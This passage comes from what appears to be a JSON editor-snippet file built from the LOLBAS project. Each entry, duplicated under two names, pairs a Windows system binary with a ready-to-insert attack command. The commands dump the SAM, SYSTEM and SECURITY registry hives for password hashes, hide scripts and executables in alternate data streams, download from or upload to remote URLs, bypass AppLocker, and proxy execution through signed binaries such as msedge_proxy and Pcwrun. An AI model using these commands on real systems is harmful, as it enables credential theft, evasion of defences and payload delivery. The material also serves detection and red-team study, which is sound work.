            "Cscript.exe is Binary used to execute scripts in Windows. it can Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs${0}",
            "```"
        ],
        "description": "Cscript.exe is Binary used to execute scripts in Windows. it can Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "Reg.exe Hide/plant registry information in Alternate data stream for later use (lolbas)": {
        "prefix": "Reg.exe",
        "body": [
            "Reg.exe is Used to manipulate the registry. it can Export the target Registry key and save it to the specified .REG file within an Alternate data stream., requires  privilege, category: ADS, it can be used for Hide/plant registry information in Alternate data stream for later use.",
            "",
            "```sh",
            "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg${0}",
            "```"
        ],
        "description": "Reg.exe is Used to manipulate the registry. it can Export the target Registry key and save it to the specified .REG file within an Alternate data stream., requires  privilege, category: ADS, it can be used for Hide/plant registry information in Alternate data stream for later use."
    },
    "lolbas Reg.exe Hide/plant registry information in Alternate data stream for later use": {
        "prefix": "lolbas Reg.exe",
        "body": [
            "Reg.exe is Used to manipulate the registry. it can Export the target Registry key and save it to the specified .REG file within an Alternate data stream., requires  privilege, category: ADS, it can be used for Hide/plant registry information in Alternate data stream for later use.",
            "",
            "```sh",
            "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg${0}",
            "```"
        ],
        "description": "Reg.exe is Used to manipulate the registry. it can Export the target Registry key and save it to the specified .REG file within an Alternate data stream., requires  privilege, category: ADS, it can be used for Hide/plant registry information in Alternate data stream for later use."
    },
    "Reg.exe Dump credentials from the Security Account Manager (SAM) (lolbas)": {
        "prefix": "Reg.exe",
        "body": [
            "Reg.exe is Used to manipulate the registry. it can Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material, requires  privilege, category: Credentials, it can be used for Dump credentials from the Security Account Manager (SAM).",
            "",
            "```sh",
            "reg save HKLM\\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\\SAM {PATH_ABSOLUTE:.3.bak}${0}",
            "```"
        ],
        "description": "Reg.exe is Used to manipulate the registry. it can Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material, requires  privilege, category: Credentials, it can be used for Dump credentials from the Security Account Manager (SAM)."
    },
    "lolbas Reg.exe Dump credentials from the Security Account Manager (SAM)": {
        "prefix": "lolbas Reg.exe",
        "body": [
            "Reg.exe is Used to manipulate the registry. it can Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material, requires  privilege, category: Credentials, it can be used for Dump credentials from the Security Account Manager (SAM).",
            "",
            "```sh",
            "reg save HKLM\\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\\SAM {PATH_ABSOLUTE:.3.bak}${0}",
            "```"
        ],
        "description": "Reg.exe is Used to manipulate the registry. it can Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material, requires  privilege, category: Credentials, it can be used for Dump credentials from the Security Account Manager (SAM)."
    },
    "IMEWDBLD.exe Download file from Internet (lolbas)": {
        "prefix": "IMEWDBLD.exe",
        "body": [
            "IMEWDBLD.exe is Microsoft IME Open Extended Dictionary Module. it can IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "IMEWDBLD.exe is Microsoft IME Open Extended Dictionary Module. it can IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas IMEWDBLD.exe Download file from Internet": {
        "prefix": "lolbas IMEWDBLD.exe",
        "body": [
            "IMEWDBLD.exe is Microsoft IME Open Extended Dictionary Module. it can IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "IMEWDBLD.exe is Microsoft IME Open Extended Dictionary Module. it can IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "Csc.exe Compile attacker code on system. Bypass defensive counter measures. (lolbas)": {
        "prefix": "Csc.exe",
        "body": [
            "Csc.exe is Binary file used by .NET Framework to compile C# code. it can Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "csc -target:library {PATH:.cs}${0}",
            "```"
        ],
        "description": "Csc.exe is Binary file used by .NET Framework to compile C# code. it can Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "lolbas Csc.exe Compile attacker code on system. Bypass defensive counter measures.": {
        "prefix": "lolbas Csc.exe",
        "body": [
            "Csc.exe is Binary file used by .NET Framework to compile C# code. it can Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "csc -target:library {PATH:.cs}${0}",
            "```"
        ],
        "description": "Csc.exe is Binary file used by .NET Framework to compile C# code. it can Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "Pnputil.exe Add malicious driver (lolbas)": {
        "prefix": "Pnputil.exe",
        "body": [
            "Pnputil.exe is Used for installing drivers. it can Used for installing drivers, requires  privilege, category: Execute, it can be used for Add malicious driver.",
            "",
            "```sh",
            "pnputil.exe -i -a {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Pnputil.exe is Used for installing drivers. it can Used for installing drivers, requires  privilege, category: Execute, it can be used for Add malicious driver."
    },
    "lolbas Pnputil.exe Add malicious driver": {
        "prefix": "lolbas Pnputil.exe",
        "body": [
            "Pnputil.exe is Used for installing drivers. it can Used for installing drivers, requires  privilege, category: Execute, it can be used for Add malicious driver.",
            "",
            "```sh",
            "pnputil.exe -i -a {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Pnputil.exe is Used for installing drivers. it can Used for installing drivers, requires  privilege, category: Execute, it can be used for Add malicious driver."
    },
    "Atbroker.exe Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry. (lolbas)": {
        "prefix": "Atbroker.exe",
        "body": [
            "Atbroker.exe is Helper binary for Assistive Technology (AT). it can Start a registered Assistive Technology (AT)., requires  privilege, category: Execute, it can be used for Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry..",
            "",
            "```sh",
            "ATBroker.exe /start malware${0}",
            "```"
        ],
        "description": "Atbroker.exe is Helper binary for Assistive Technology (AT). it can Start a registered Assistive Technology (AT)., requires  privilege, category: Execute, it can be used for Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.."
    },
    "lolbas Atbroker.exe Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.": {
        "prefix": "lolbas Atbroker.exe",
        "body": [
            "Atbroker.exe is Helper binary for Assistive Technology (AT). it can Start a registered Assistive Technology (AT)., requires  privilege, category: Execute, it can be used for Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry..",
            "",
            "```sh",
            "ATBroker.exe /start malware${0}",
            "```"
        ],
        "description": "Atbroker.exe is Helper binary for Assistive Technology (AT). it can Start a registered Assistive Technology (AT)., requires  privilege, category: Execute, it can be used for Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.."
    },
    "DataSvcUtil.exe Upload file (lolbas)": {
        "prefix": "DataSvcUtil.exe",
        "body": [
            "DataSvcUtil.exe is DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file.",
            "",
            "```sh",
            "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}${0}",
            "```"
        ],
        "description": "DataSvcUtil.exe is DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file."
    },
    "lolbas DataSvcUtil.exe Upload file": {
        "prefix": "lolbas DataSvcUtil.exe",
        "body": [
            "DataSvcUtil.exe is DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file.",
            "",
            "```sh",
            "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}${0}",
            "```"
        ],
        "description": "DataSvcUtil.exe is DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.. it can Upload file, credentials or data exfiltration in general, requires  privilege, category: Upload, it can be used for Upload file."
    },
    "iediagcmd.exe Spawn a pre-planted executable from iediagcmd.exe. (lolbas)": {
        "prefix": "iediagcmd.exe",
        "body": [
            "iediagcmd.exe is Diagnostics Utility for Internet Explorer. it can Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from iediagcmd.exe..",
            "",
            "```sh",
            "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}${0}",
            "```"
        ],
        "description": "iediagcmd.exe is Diagnostics Utility for Internet Explorer. it can Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from iediagcmd.exe.."
    },
    "lolbas iediagcmd.exe Spawn a pre-planted executable from iediagcmd.exe.": {
        "prefix": "lolbas iediagcmd.exe",
        "body": [
            "iediagcmd.exe is Diagnostics Utility for Internet Explorer. it can Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from iediagcmd.exe..",
            "",
            "```sh",
            "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}${0}",
            "```"
        ],
        "description": "iediagcmd.exe is Diagnostics Utility for Internet Explorer. it can Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe., requires  privilege, category: Execute, it can be used for Spawn a pre-planted executable from iediagcmd.exe.."
    },
    "AppInstaller.exe Download file from Internet (lolbas)": {
        "prefix": "AppInstaller.exe",
        "body": [
            "AppInstaller.exe is Tool used for installation of AppX/MSIX applications on Windows 10. it can AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "start ms-appinstaller://?source={REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "AppInstaller.exe is Tool used for installation of AppX/MSIX applications on Windows 10. it can AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "lolbas AppInstaller.exe Download file from Internet": {
        "prefix": "lolbas AppInstaller.exe",
        "body": [
            "AppInstaller.exe is Tool used for installation of AppX/MSIX applications on Windows 10. it can AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache., requires  privilege, category: Download, it can be used for Download file from Internet.",
            "",
            "```sh",
            "start ms-appinstaller://?source={REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "AppInstaller.exe is Tool used for installation of AppX/MSIX applications on Windows 10. it can AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in INetCache., requires  privilege, category: Download, it can be used for Download file from Internet."
    },
    "Print.exe Hide binary file in alternate data stream to potentially bypass defensive counter measures (lolbas)": {
        "prefix": "Print.exe",
        "body": [
            "Print.exe is Used by Windows to send files to the printer. it can Copy file.exe into the Alternate Data Stream (ADS) of file.txt., requires  privilege, category: ADS, it can be used for Hide binary file in alternate data stream to potentially bypass defensive counter measures.",
            "",
            "```sh",
            "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Print.exe is Used by Windows to send files to the printer. it can Copy file.exe into the Alternate Data Stream (ADS) of file.txt., requires  privilege, category: ADS, it can be used for Hide binary file in alternate data stream to potentially bypass defensive counter measures."
    },
    "lolbas Print.exe Hide binary file in alternate data stream to potentially bypass defensive counter measures": {
        "prefix": "lolbas Print.exe",
        "body": [
            "Print.exe is Used by Windows to send files to the printer. it can Copy file.exe into the Alternate Data Stream (ADS) of file.txt., requires  privilege, category: ADS, it can be used for Hide binary file in alternate data stream to potentially bypass defensive counter measures.",
            "",
            "```sh",
            "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}${0}",
            "```"
        ],
        "description": "Print.exe is Used by Windows to send files to the printer. it can Copy file.exe into the Alternate Data Stream (ADS) of file.txt., requires  privilege, category: ADS, it can be used for Hide binary file in alternate data stream to potentially bypass defensive counter measures."
    },
    "Print.exe Copy files (lolbas)": {
        "prefix": "Print.exe",
        "body": [
            "Print.exe is Used by Windows to send files to the printer. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Copy files.",
            "",
            "```sh",
            "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}${0}",
            "```"
        ],
        "description": "Print.exe is Used by Windows to send files to the printer. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Copy files."
    },
    "lolbas Print.exe Copy files": {
        "prefix": "lolbas Print.exe",
        "body": [
            "Print.exe is Used by Windows to send files to the printer. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Copy files.",
            "",
            "```sh",
            "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}${0}",
            "```"
        ],
        "description": "Print.exe is Used by Windows to send files to the printer. it can Copy file from source to destination, requires  privilege, category: Copy, it can be used for Copy files."
    },
    "Print.exe Copy/Download file from remote server (lolbas)": {
        "prefix": "Print.exe",
        "body": [
            "Print.exe is Used by Windows to send files to the printer. it can Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe., requires  privilege, category: Copy, it can be used for Copy/Download file from remote server.",
            "",
            "```sh",
            "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}${0}",
            "```"
        ],
        "description": "Print.exe is Used by Windows to send files to the printer. it can Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe., requires  privilege, category: Copy, it can be used for Copy/Download file from remote server."
    },
    "lolbas Print.exe Copy/Download file from remote server": {
        "prefix": "lolbas Print.exe",
        "body": [
            "Print.exe is Used by Windows to send files to the printer. it can Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe., requires  privilege, category: Copy, it can be used for Copy/Download file from remote server.",
            "",
            "```sh",
            "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}${0}",
            "```"
        ],
        "description": "Print.exe is Used by Windows to send files to the printer. it can Copy File.exe from a network share to the target c:\\OutFolder\\outfile.exe., requires  privilege, category: Copy, it can be used for Copy/Download file from remote server."
    },
    "winget.exe Download and execute an arbitrary file from the internet (lolbas)": {
        "prefix": "winget.exe",
        "body": [
            "winget.exe is Windows Package Manager tool. it can Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`, requires  privilege, category: Execute, it can be used for Download and execute an arbitrary file from the internet.",
            "",
            "```sh",
            "winget.exe install --manifest {PATH:.yml}${0}",
            "```"
        ],
        "description": "winget.exe is Windows Package Manager tool. it can Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`, requires  privilege, category: Execute, it can be used for Download and execute an arbitrary file from the internet."
    },
    "lolbas winget.exe Download and execute an arbitrary file from the internet": {
        "prefix": "lolbas winget.exe",
        "body": [
            "winget.exe is Windows Package Manager tool. it can Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`, requires  privilege, category: Execute, it can be used for Download and execute an arbitrary file from the internet.",
            "",
            "```sh",
            "winget.exe install --manifest {PATH:.yml}${0}",
            "```"
        ],
        "description": "winget.exe is Windows Package Manager tool. it can Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`, requires  privilege, category: Execute, it can be used for Download and execute an arbitrary file from the internet."
    },
    "winget.exe Download and install software from Microsoft Store, even if Microsoft Store App is blocked (lolbas)": {
        "prefix": "winget.exe",
        "body": [
            "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: Download, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked.",
            "",
            "```sh",
            "winget.exe install --accept-package-agreements -s msstore {name or ID}${0}",
            "```"
        ],
        "description": "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: Download, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked."
    },
    "lolbas winget.exe Download and install software from Microsoft Store, even if Microsoft Store App is blocked": {
        "prefix": "lolbas winget.exe",
        "body": [
            "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: Download, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked.",
            "",
            "```sh",
            "winget.exe install --accept-package-agreements -s msstore {name or ID}${0}",
            "```"
        ],
        "description": "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: Download, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked."
    },
    "winget.exe Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine (lolbas)": {
        "prefix": "winget.exe",
        "body": [
            "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: AWL Bypass, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine.",
            "",
            "```sh",
            "winget.exe install --accept-package-agreements -s msstore {name or ID}${0}",
            "```"
        ],
        "description": "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: AWL Bypass, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine."
    },
    "lolbas winget.exe Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine": {
        "prefix": "lolbas winget.exe",
        "body": [
            "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: AWL Bypass, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine.",
            "",
            "```sh",
            "winget.exe install --accept-package-agreements -s msstore {name or ID}${0}",
            "```"
        ],
        "description": "winget.exe is Windows Package Manager tool. it can Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use \"Sysinternals Suite\" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this., requires  privilege, category: AWL Bypass, it can be used for Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine."
    },
    "msedge_proxy.exe Download file from the internet (lolbas)": {
        "prefix": "msedge_proxy.exe",
        "body": [
            "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy will download malicious file., requires  privilege, category: Download, it can be used for Download file from the internet.",
            "",
            "```sh",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}${0}",
            "```"
        ],
        "description": "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy will download malicious file., requires  privilege, category: Download, it can be used for Download file from the internet."
    },
    "lolbas msedge_proxy.exe Download file from the internet": {
        "prefix": "lolbas msedge_proxy.exe",
        "body": [
            "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy will download malicious file., requires  privilege, category: Download, it can be used for Download file from the internet.",
            "",
            "```sh",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe {REMOTEURL:.zip}${0}",
            "```"
        ],
        "description": "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy will download malicious file., requires  privilege, category: Download, it can be used for Download file from the internet."
    },
    "msedge_proxy.exe Executes a process under a trusted Microsoft signed binary (lolbas)": {
        "prefix": "msedge_proxy.exe",
        "body": [
            "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy.exe will execute file in the background, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"${0}",
            "```"
        ],
        "description": "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy.exe will execute file in the background, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "lolbas msedge_proxy.exe Executes a process under a trusted Microsoft signed binary": {
        "prefix": "lolbas msedge_proxy.exe",
        "body": [
            "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy.exe will execute file in the background, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary.",
            "",
            "```sh",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"${0}",
            "```"
        ],
        "description": "msedge_proxy.exe is Microsoft Edge Browser. it can msedge_proxy.exe will execute file in the background, requires  privilege, category: Execute, it can be used for Executes a process under a trusted Microsoft signed binary."
    },
    "Pcwrun.exe Proxy execution of binary (lolbas)": {
        "prefix": "Pcwrun.exe",
        "body": [
            "Pcwrun.exe is Program Compatibility Wizard. it can Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "Pcwrun.exe /../../$(calc).exe${0}",
            "```"
        ],
        "description": "Pcwrun.exe is Program Compatibility Wizard. it can Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "lolbas Pcwrun.exe Proxy execution of binary": {
        "prefix": "lolbas Pcwrun.exe",
        "body": [
            "Pcwrun.exe is Program Compatibility Wizard. it can Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: Execute, it can be used for Proxy execution of binary.",
            "",
            "```sh",
            "Pcwrun.exe /../../$(calc).exe${0}",
            "```"
        ],
        "description": "Pcwrun.exe is Program Compatibility Wizard. it can Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: Execute, it can be used for Proxy execution of binary."
    },
    "vbc.exe Compile attacker code on system. Bypass defensive counter measures. (lolbas)": {
        "prefix": "vbc.exe",
        "body": [
            "vbc.exe is Binary file used for compile vbs code. it can Binary file used by .NET to compile Visual Basic code to an executable., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}${0}",
            "```"
        ],
        "description": "vbc.exe is Binary file used for compile vbs code. it can Binary file used by .NET to compile Visual Basic code to an executable., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "lolbas vbc.exe Compile attacker code on system. Bypass defensive counter measures.": {
        "prefix": "lolbas vbc.exe",
        "body": [
            "vbc.exe is Binary file used for compile vbs code. it can Binary file used by .NET to compile Visual Basic code to an executable., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures..",
            "",
            "```sh",
            "vbc -reference:Microsoft.VisualBasic.dll {PATH_ABSOLUTE:.vb}${0}",
            "```"
        ],
        "description": "vbc.exe is Binary file used for compile vbs code. it can Binary file used by .NET to compile Visual Basic code to an executable., requires  privilege, category: Compile, it can be used for Compile attacker code on system. Bypass defensive counter measures.."
    },
    "Diantz.exe Hide data compressed into an Alternate Data Stream. (lolbas)": {
        "prefix": "Diantz.exe",
        "body": [
            "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an Alternate Data Stream..",
            "",
            "```sh",
            "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab${0}",
            "```"
        ],
        "description": "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an Alternate Data Stream.."
    },
    "lolbas Diantz.exe Hide data compressed into an Alternate Data Stream.": {
        "prefix": "lolbas Diantz.exe",
        "body": [
            "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an Alternate Data Stream..",
            "",
            "```sh",
            "diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab${0}",
            "```"
        ],
        "description": "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Hide data compressed into an Alternate Data Stream.."
    },
    "Diantz.exe Download and compress into a cab file. (lolbas)": {
        "prefix": "Diantz.exe",
        "body": [
            "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Download and compress a remote file and store it in a CAB file on local machine., requires  privilege, category: Download, it can be used for Download and compress into a cab file..",
            "",
            "```sh",
            "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}${0}",
            "```"
        ],
        "description": "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Download and compress a remote file and store it in a CAB file on local machine., requires  privilege, category: Download, it can be used for Download and compress into a cab file.."
    },
    "lolbas Diantz.exe Download and compress into a cab file.": {
        "prefix": "lolbas Diantz.exe",
        "body": [
            "Diantz.exe is Binary that package existing files into a cabinet (.cab) file. it can Download and compress a remote file and store it in a CAB file on local machine., requires  privilege, category: Download, it can be used for Download and compress into a cab file..",
            "",
            "```sh",
            "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}${0}",
            "```"
        ],
